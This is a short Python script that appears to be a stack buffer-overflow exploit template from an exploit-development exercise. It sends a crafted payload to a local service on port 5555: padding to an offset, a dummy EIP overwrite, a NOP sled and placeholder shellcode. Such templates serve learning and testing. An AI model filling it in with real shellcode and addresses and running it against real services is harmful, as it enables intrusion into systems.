#!/usr/bin/python
import socket

total = 1024
off = 264		#offset length
sc = ""
sc += "A"		#Shellcode block
noplen = 32		#length of NOP sled
jmp = "BBBB"	#Dummy EIP overwrite

s=socket.socket()
s.connect(("localhost",5555))
print (s.recv(1024))
exploit = ""
exploit += "A"*off + jmp + "\x90"*noplen + sc
exploit += "C"*(total-off-4-len(sc)-noplen)
s.send(exploit)
s.close